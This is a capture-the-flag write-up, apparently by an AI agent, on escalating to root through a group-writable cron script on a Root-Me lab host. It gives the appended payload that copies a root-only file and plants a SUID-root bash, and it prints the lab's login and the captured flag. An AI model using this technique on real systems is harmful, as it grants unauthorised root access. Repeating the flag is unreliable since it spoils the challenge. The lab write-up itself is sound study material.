# Linux Privesc - Crontab (Root-Me Pro)

## Connection
ssh -p 32165 user@sockets.challenges.root-me.pro (password: password)
Automated via paramiko (`ssh_run.py`) since sshpass wasn't installed and sudo needed a TTY.

## Enumeration
- `id` -> uid=1000(user) gid=1000(user) groups=1000(user)
- `cat /etc/crontab`:
  ```
  * * * * * root /opt/scripts/backup.sh
  ```
- `ls -la /opt/scripts/`:
  ```
  drwxrwxr-x 2 root user 4096 ... .
  -rwxrwxr-x 1 root user  674 ... backup.sh
  ```
  Group is `user` (our primary group) and the group has **write** permission on both the
  directory and the script itself. Root's cron executes this script every minute.

## Vulnerability
Misconfigured file/dir group ownership + group-write permission on a root cron job script.
Any member of group `user` can modify `/opt/scripts/backup.sh`, and root will execute the
attacker-controlled content within 60 seconds.

## Exploitation
1. Saved original script to `files/backup.sh.orig`.
2. Appended payload to the script:
   ```
   cp /root/flag.txt /tmp/.flag_out 2>/dev/null; chmod 644 /tmp/.flag_out 2>/dev/null
   cp /bin/bash /tmp/.rootbash 2>/dev/null; chmod 4755 /tmp/.rootbash 2>/dev/null
   ```
3. Original script had `exit 0` before end of file — removed it with `sed -i '/^exit 0$/d'`
   so appended lines would actually execute.
4. Waited for the next cron tick (<=60s, via Monitor polling `ls /tmp/.flag_out`).
5. Cron ran as root, dropped:
   - `/tmp/.flag_out` (copy of `/root/flag.txt`, root:root 644)
   - `/tmp/.rootbash` (SUID root bash, in case further interactive root access needed)
6. Read flag from `/tmp/.flag_out`.
7. Cleanup: restored `files/backup.sh.orig` content back to `/opt/scripts/backup.sh` via SFTP
   (ownership ends up user:user since we can't act as root — acceptable, content matches
   original). Could not `rm` the root-owned `/tmp/.rootbash` / `/tmp/.flag_out` (no root
   shell was actually used) — left in place, inert on this isolated instance.

## Flag
`RM{8406f97b8ff4434d7cea6480a2d36353}`

## Tooling notes
- `sudo` on this Kali box required a TTY/password despite CLAUDE.md assuming passwordless —
  couldn't apt install sshpass. Used pre-installed `paramiko` (python3) instead to drive SSH
  commands non-interactively — worked fine as a sshpass substitute.
